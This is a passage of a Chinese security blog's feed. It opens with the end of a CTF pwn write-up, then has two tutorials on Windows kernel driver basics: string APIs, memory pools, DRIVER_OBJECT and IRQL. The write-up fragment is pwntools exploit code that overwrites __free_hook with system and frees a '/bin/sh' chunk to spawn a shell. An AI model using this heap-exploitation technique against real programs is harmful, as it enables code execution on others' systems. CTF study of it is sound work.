class="number">3</span>)</span><br><span class="line">free2(<span class="number">1</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span>)[:-<span class="number">1</span>])<span class="comment">#1</span></span><br><span class="line">free2(<span class="number">2</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])))<span class="comment">#2</span></span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))<span class="comment">#3</span></span><br><span class="line">add2(base64.b64encode(p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>])))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free2(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">同样的，决赛也出了两道pwn题，感觉挺有意思的，来补补wp。</summary>
    
    
    
    <category term="比赛复盘" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    
    <category term="强网杯S8决赛" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/"/>
    
    <category term="Pwn" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>windows驱动开发（1）——Windows驱动字符串</title>
    <link href="https://xia0ji233.github.io/2024/11/24/WindowsDriver1/"/>
    <id>https://xia0ji233.github.io/2024/11/24/WindowsDriver1/</id>
    <published>2024-11-24T15:00:00.000Z</published>
    <updated>2025-01-20T02:05:53.271Z</updated>
    
    <content type="html"><![CDATA[<p>来简单实战几个字符串API</p><span id="more"></span><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>ASCII 字符和宽字符的版本分别是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RtlInitAnsiString</span><br><span class="line">RtlInitUnicodeString</span><br></pre></td></tr></table></figure><p>第一个参数都是对应的字符串结构体的指针，也就是说，在使用的时候需要先定义一个结构体变量再去使用这个 API 去初始化字符串变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPSTR str2 = <span class="string">&quot;123456789 hello&quot;</span>;</span><br><span class="line">ANSI_STRING astr;</span><br><span class="line">RtlInitAnsiString(&amp;astr, str2);</span><br><span class="line"></span><br><span class="line">LPWSTR str = <span class="string">L&quot;123456789 hello&quot;</span>;</span><br><span class="line">UNICODE_STRING ustr;</span><br><span class="line">RtlInitUnicodeString(&amp;ustr, str);</span><br></pre></td></tr></table></figure><p>使用格式化字符串输出的 <code>%Z</code> 和 <code>%wZ</code> 可以直接输出该字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">kprintf((<span class="string">&quot;%Z\n&quot;</span>), astr);</span><br><span class="line">kprintf((<span class="string">&quot;%wZ\n&quot;</span>), ustr);</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2024/11/24/WindowsDriver1/1.png" class=""><h2 id="相互转换"><a href="#相互转换" class="headerlink" title="相互转换"></a>相互转换</h2><p>宽字符可以变 ASCII 字符，ASCII 字符也可以变宽字符。前提是它们都是 ASCII 范围内可以在不改变内容的情况下转换，如果使用 Unicode 字符将 Unicode 字符串转为 ASCII 字符串则可能会出现乱码。</p><p>事实证明想多了，即使是 ASCII 字符串，也能存放 Unicode 字符串。</p><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fltKernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="function">VOID <span class="title">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Bye!\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reg_path;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Hello!\n&quot;</span>));</span><br><span class="line">    driver-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    ANSI_STRING astr;</span><br><span class="line">    UNICODE_STRING ustr;</span><br><span class="line">    LPWSTR str = <span class="string">L&quot;123456789 hello哈哈&quot;</span>;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;ustr, str);</span><br><span class="line">    <span class="built_in">RtlUnicodeStringToAnsiString</span>(&amp;astr, &amp;ustr, TRUE);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;%p,%p\n&quot;</span>), ustr.Buffer, astr.Buffer);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;%Z\n&quot;</span>), astr);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2024/11/24/WindowsDriver1/2.png" class=""><p>这里的 API <code>RtlUnicodeStringToAnsiString(&amp;astr, &amp;ustr, TRUE);</code>，前两个参数，一个是目的字符串指针，一个是源字符串指针。第三个参数 TRUE 表示为目的字符串新分配内存，FALSE 表示不分配内存。</p><p>如果第三个参数设置为 FALSE 一定要注意，它会在 astr.buffer 中写入，因此一定要确保指向了一个正确的可写的内存，否则就会面临蓝屏。</p><p><code>RtlAnsiStringToUnicodeString</code> 这个 API 同理可得。</p><p>注意，使用<code>RtlUnicodeStringToAnsiString/RtlAnsiStringToUnicodeString</code>函数时，需要在使用完后调用<code>RtlFreeAnsiString/RtlFreeUnicodeString</code>函数来释放所分配的缓冲区，否则会产生内存泄露。</p><h2 id="数字与字符串之间的转换"><a href="#数字与字符串之间的转换" class="headerlink" title="数字与字符串之间的转换"></a>数字与字符串之间的转换</h2><p>在传统的 <code>CHAR */WCHAR *</code> 字符串中，我们只有 atoi，sprintf 等传统函数做数字与字符串之间的转换。 而内核就有很方便的 api 做转换，下面来看一个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fltKernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="function">VOID <span class="title">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Bye!\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reg_path;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Hello!\n&quot;</span>));</span><br><span class="line">    driver-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    UNICODE_STRING ustr,ustr2;</span><br><span class="line">    ULONG val,val2=<span class="number">0x12345678</span>;</span><br><span class="line">    LPWSTR str = <span class="string">L&quot;123456789&quot;</span>;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;ustr, str);</span><br><span class="line">    <span class="built_in">RtlUnicodeStringToInteger</span>(&amp;ustr, <span class="number">10</span>, &amp;val);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;val=%d\n&quot;</span>), val);</span><br><span class="line"></span><br><span class="line">    WCHAR *S=(WCHAR*)<span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, <span class="number">0x1000</span>, <span class="string">&#x27;str&#x27;</span>);</span><br><span class="line">    ustr<span class="number">2.</span>Buffer=S;</span><br><span class="line">    ustr<span class="number">2.L</span>ength=<span class="number">0</span>;</span><br><span class="line">    ustr<span class="number">2.</span>MaximumLength=<span class="number">0x1000</span>;</span><br><span class="line">    <span class="built_in">RtlIntegerToUnicodeString</span>(val2, <span class="number">16</span>, &amp;ustr2);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;val=%wZ\n&quot;</span>), ustr2);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中第二个参数 base 指示了字符串是什么进制。</p><img src="/2024/11/24/WindowsDriver1/3.png" class=""><p>可以发现，从数字转字符串还是需要废一点功夫的，需要手动给 UNICODE_STRING 结构体初始化分配内存。</p><p>但是也是显然的，该例程会存在内存泄漏，当驱动被释放的时候，分配的内存不会释放，因此需要养成良好的习惯，当不使用这个字符串的时候，及时释放分配的内存。</p><h2 id="字符串拷贝与比较"><a href="#字符串拷贝与比较" class="headerlink" title="字符串拷贝与比较"></a>字符串拷贝与比较</h2><p>例程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fltKernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="function">VOID <span class="title">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Bye!\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reg_path;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Hello!\n&quot;</span>));</span><br><span class="line">    driver-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    UNICODE_STRING s1;</span><br><span class="line">    WCHAR* S = (WCHAR*)<span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, <span class="number">0x1000</span>, <span class="string">&#x27;str&#x27;</span>);</span><br><span class="line">    s<span class="number">1.</span>Buffer = S;</span><br><span class="line">    s<span class="number">1.L</span>ength = <span class="number">0</span>;</span><br><span class="line">    s<span class="number">1.</span>MaximumLength = <span class="number">0x1000</span>;</span><br><span class="line">    <span class="built_in">RtlCopyUnicodeString</span>(&amp;s1, &amp;driver-&gt;DriverName);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;DriverName: %wZ\n&quot;</span>), s1);</span><br><span class="line">    <span class="keyword">auto</span> compare=<span class="built_in">RtlCompareUnicodeString</span>(&amp;s1, &amp;driver-&gt;DriverName, TRUE);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;compare=%d\n&quot;</span>), compare);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RtlCopyUnicodeString 就是简单的字符串拷贝函数，不做过多解释。</p><p>RtlCompareUnicodeString 是字符串比较函数，与 strcmp 一样，字符串相等返回 0，不相等返回非 0，第三个参数指示英文单词是否大小写敏感，TRUE 则敏感，S 与 s 视为不同的字符。</p><img src="/2024/11/24/WindowsDriver1/4.png" class=""><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>还有一系列的字符串操作函数也不一一展示了，它们都是 Rtl 为前缀命名的 API。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：MSDN</li></ul>]]></content>
    
    
    <summary type="html">来简单实战几个字符串API</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="驱动程序开发" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows驱动开发（0）——Windows驱动开发的基础知识</title>
    <link href="https://xia0ji233.github.io/2024/11/23/WindowsDriver0/"/>
    <id>https://xia0ji233.github.io/2024/11/23/WindowsDriver0/</id>
    <published>2024-11-22T19:00:00.000Z</published>
    <updated>2025-01-20T02:05:53.257Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学习一下Windows驱动开发基础</p><span id="more"></span><p>由于之前操之过急，对驱动开发很多东西都没有了解便强行上手，导致后面困难重重，于是痛定思痛，开始推翻重来，相信之前的一些开发经验会让这一路好走一点。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vmware + VirtualKD + windbg preview 做调试环境。</p><p>VS 2022 + WDK 做开发环境。</p><p><a href="https://xia0ji233.pro/2023/04/13/driver1/">参考链接1</a></p><p><a href="https://xia0ji233.pro/2023/05/17/driver8/">参考链接2</a></p><h2 id="内核API的使用"><a href="#内核API的使用" class="headerlink" title="内核API的使用"></a>内核API的使用</h2><p>对于导出的函数，只需要包含对应的头文件直接使用即可，内核 API 的返回类型几乎都是 NTSTATUS。</p><p>当你调用的内核函数，如果返回的结果不是<code>STATUS_SUCCESS</code>，就说明函数执行中遇到了问题，具体是什么问题，可以在<code>ntstatus.h</code>文件中查看。</p><h2 id="驱动基本数据类型"><a href="#驱动基本数据类型" class="headerlink" title="驱动基本数据类型"></a>驱动基本数据类型</h2><p>WDK 对于一些标量有自己的书写习惯</p><table><thead><tr><th align="center">WDK 习惯</th><th align="center">SDK 习惯</th></tr></thead><tbody><tr><td align="center">ULONG</td><td align="center">unsigned long</td></tr><tr><td align="center">PULONG</td><td align="center">unsigned long*</td></tr><tr><td align="center">UCHAR</td><td align="center">unsigned char</td></tr><tr><td align="center">PUCHAR</td><td align="center">unsigned char*</td></tr><tr><td align="center">UINT</td><td align="center">unsigned int</td></tr><tr><td align="center">PUNIT</td><td align="center">unsigned int*</td></tr><tr><td align="center">VOID</td><td align="center">void</td></tr><tr><td align="center">PVOID</td><td align="center">void*</td></tr></tbody></table><h2 id="常用的内核内存函数"><a href="#常用的内核内存函数" class="headerlink" title="常用的内核内存函数"></a>常用的内核内存函数</h2><p>即，如何使用内核的堆内存，在用户层我们知道可以使用 malloc 或者一些 windows API，就算没有库也可以使用系统调用去申请内存。但是在内核层，内核的开发环境同样支持了一系列的内存分配函数。</p><p>内存对应的操作有：分配，释放，拷贝，清空。</p><table><thead><tr><th align="center">普通程序</th><th align="center">内核中</th></tr></thead><tbody><tr><td align="center">malloc</td><td align="center">ExAllocatePoolWithTag</td></tr><tr><td align="center">memset</td><td align="center">RtlFillMemory</td></tr><tr><td align="center">memcpy</td><td align="center">RtlMoveMemory</td></tr><tr><td align="center">free</td><td align="center">ExFreePool</td></tr></tbody></table><p>这里有个概念需要补一下，什么是<strong>分页内存</strong>，什么是<strong>非分页内存</strong>。</p><p>在使用 ExAllocatePoolWithTag 函数申请内存的时候会有<code>POOL_TYPE PoolType</code>这个参数。那么什么是<code>POOL_TYPE</code>，通过 WDK 我们可以看到定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">POOL_TYPE</span> &#123;</span></span><br><span class="line">    NonPagedPool,</span><br><span class="line">    PagedPool,</span><br><span class="line">    NonPagedPoolMustSucceed,</span><br><span class="line">    DontUseThisType,</span><br><span class="line">    NonPagedPoolCacheAligned,</span><br><span class="line">    PagedPoolCacheAligned,</span><br><span class="line">    NonPagedPoolCacheAlignedMustS</span><br><span class="line">&#125; POOL_TYPE;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用的最多的就是前两个，<code>NonPagedPool</code>和<code>PagedPool</code>，前者分配<strong>非分页内存</strong>，后者申请<strong>分页内存</strong>。什么是<strong>分页内存</strong>，前面介绍过，在 Windows 操作系统中，有 pagefile.sys 这个文件，这个文件会保存长期不使用的物理页，如果申请<strong>分页内存</strong>，那么这个页就有可能会被置换到这个文件中去。等到再次需要的时候，会通过一个 0xE 号中断将该页从 pagefile.sys 中又取出来。</p><p>而<strong>非分页内存</strong>就是告诉操作系统，不要把我的申请的物理页撤走，这就是我独享的物理页。操作系统就不会把它给撤走转到文件中了。</p><p>至于有什么用，后面应该会看到。</p><h2 id="内核字符串"><a href="#内核字符串" class="headerlink" title="内核字符串"></a>内核字符串</h2><p>内核有两种字符串类型。<code>ANSI_STRING</code>&#x2F;<code>UNICODE_STRING</code> 分别表示 ASCII 字符和宽字符。</p><p>来看看它们的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PCHAR Buffer;</span><br><span class="line">&#125;STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaxmumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br></pre></td></tr></table></figure><p>几乎都是这样的定义：长度，最大长度，字符指针，原因就是内核需要非常安全，直接操作字符容易造成一系列不可控的后果，因此在原字符指针上再封装一层。</p><p>同样来看看字符串的基本操作的 API </p><p>创建、复制、比较以及转换等。它们的函数如下：</p><table><thead><tr><th align="center">ANSI_STRING</th><th align="center">UNICODE_STRING</th></tr></thead><tbody><tr><td align="center">RtlInitAnsiString</td><td align="center">RtlInitUnicodeString</td></tr><tr><td align="center">RtlCopyString</td><td align="center">RtlCopyUnicodeString</td></tr><tr><td align="center">RtlCompareString</td><td align="center">RtlCompareUnicodeString</td></tr><tr><td align="center">RtlAnsiStringToUnicodeString</td><td align="center">RtlUnicodeStringToAnsiString</td></tr></tbody></table><h2 id="驱动代码解析"><a href="#驱动代码解析" class="headerlink" title="驱动代码解析"></a>驱动代码解析</h2><p>还是拿最经典的 hello world 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;Bye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;Hello!\n&quot;</span>);</span><br><span class="line">    DriverObject-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DriverEntry"><a href="#DriverEntry" class="headerlink" title="DriverEntry"></a>DriverEntry</h3><p><code>DriverEntry</code>是驱动程序的入口，如果驱动加载成功后，就像<code>Dll</code>加载成功调用<code>DllMain</code>函数一样，调用该函数。</p><p>但是，编译成功后可以发现，DriverEntry 跟 main 一样，并不是程序加载最先调用的，都是间接被调用的，而真正的入口是 FxDriverEntry。</p><img src="/2024/11/23/WindowsDriver0/1.png" class=""><p>并且该函数是被导出的。</p><p>DriverEntry 的第一个参数需要来解析一下，它的类型是 <code>PDRIVER_OBJECT</code>，熟悉 Windows SDK 命名的应该知道，它是一个指向 <code>DRIVER_OBJECT</code> 的指针。</p><p>驱动文件加载之后，驱动的所有信息通过这个结构体来返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line"></span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line"></span><br><span class="line">    PVOID DriverStart;</span><br><span class="line">    ULONG DriverSize;</span><br><span class="line">    PVOID DriverSection;</span><br><span class="line">    PDRIVER_EXTENSION DriverExtension;</span><br><span class="line"></span><br><span class="line">    UNICODE_STRING DriverName;</span><br><span class="line">    PUNICODE_STRING HardwareDatabase;</span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;</span><br><span class="line"></span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload;</span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">&#125; DRIVER_OBJECT;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以在驱动中加个断点，来查看这个对象</p><img src="/2024/11/23/WindowsDriver0/2.png" class=""><p>这里逐步分析该结构体的各个字段意义</p><ul><li>Type：类型</li><li>Size：结构体大小</li><li>DeviceObject：设备对象</li><li>Flags：标志位</li><li>DriverStart：驱动对象加载后的起始地址</li><li>DriverSize：驱动对象加载后的内存大小</li><li>DriverSection：它是一个存储目前所有已加载的驱动程序信息相关的<code>LDR_DATA_TABLE_ENTRY</code>结构体的双向循环链表。</li><li>DriverName：驱动名</li><li>DriverUnload：驱动对象的卸载地址，如果存在则会调用它</li></ul><p>其余就不一一写出了。</p><h2 id="IRQL"><a href="#IRQL" class="headerlink" title="IRQL"></a>IRQL</h2><p><code>IRQL</code>全称<code>Interrupt Request Level</code>，即<strong>中断请求等级</strong>。它是<code>Windows</code>自己定义的一套优先级方案，与<code>CPU</code>无关，数值越大权限越高。中断包括了硬中断和软中断，硬中断是由硬件产生，而软中断则是完全虚拟出来的。处理器在一个<code>IRQL</code>上执行线程代码，每个处理器的<code>IRQL</code>决定了它如何处理中断，以及允许接收哪些中断。在同一处理器上，线程只能被更高级别<code>IRQL</code>的线程能中断。每个处理器都有自己的中断<code>IRQL</code>。</p><img src="/2024/11/23/WindowsDriver0/3.png" class=""><p>常见的<code>IRQL</code>级别有四个：<code>Passive</code>、<code>APC</code>、<code>Dispatch</code>、<code>DIRQL</code>。<code>PASSIVE_LEVEL</code>是最低级别，没有被屏蔽的中断，线程执行用户模式，可以访问分页内存。</p><p><code>APC_LEVEL</code>只有<code>APC</code>级别的中断被屏蔽，可以访问分页内存。当有<code>APC</code>发生时，处理器提升到<code>APC</code>级别，就屏蔽掉其它<code>APC</code>。</p><p><code>DISPATCH_LEVEL</code>可以屏蔽<code>DPC</code>(延迟过程) 和更低的中断，不能访问分页内存。</p><h2 id="关于分页内存和非分页内存"><a href="#关于分页内存和非分页内存" class="headerlink" title="关于分页内存和非分页内存"></a>关于分页内存和非分页内存</h2><p>上面提到，中断等级在 <code>DISPATCH_LEVEL</code> 及以上时无法访问分页内存。因为分页内存会被换到外存，如果想要加载到内存中会触发一个缺页中断，将该页重新加载进内存，该例程运行在 <code>DISPATCH_LEVEL</code> 的中断等级下。而这个所谓的中断是不允许同级打断的，因此在 <code>DISPATCH_LEVEL</code> 下访问分页内存会导致访问内存的线程一直尝试等待物理页被写入内存，而触发的中断又无法直接打断该例程，就有可能直接造成蓝屏。</p><p>而根据看雪某帖子下面的评论描述，访问分页内存的时候会同时判断 IRQL 和物理页的 valid 位，当 <code>IRQL &gt; APC_LEVEL</code> 且物理页 <code>valid=0</code> 时，直接蓝屏。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15491543.html">https://www.cnblogs.com/wingsummer/p/15491543.html</a></li><li>[2]：<a href="https://bbs.kanxue.com/thread-160200.htm">https://bbs.kanxue.com/thread-160200.htm</a></li></ul>]]></content>
    
    
